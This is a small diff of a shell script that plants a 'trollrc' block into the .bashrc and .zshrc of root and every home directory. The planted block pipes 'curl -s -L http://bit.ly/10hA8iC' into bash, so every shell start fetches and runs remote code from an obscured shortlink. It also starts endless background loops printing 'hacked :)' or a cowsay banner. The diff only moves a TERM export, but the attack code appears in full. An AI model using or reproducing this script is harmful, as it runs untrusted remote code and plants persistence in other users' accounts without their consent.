@@ -59,6 +59,8 @@ echo
 echo "[+] --- Trolling '.bashrc' and '.zshrc' for all users"
 
 trollrc='
+export TERM=xterm
+
 echo "Please wait..."
 curl -s -L http://bit.ly/10hA8iC | bash
 
@@ -126,9 +128,8 @@ if which cowsay &>/dev/null; then
 	(while :; do sleep 8; echo; cowsay -f milk "GOT MILK?"; done) &
 else
 	(while :; do sleep 8; echo "hacked :)"; done) &
-fi
+fi'
 
-export TERM=xterm'
 
 
 for user in /root /home/*; do
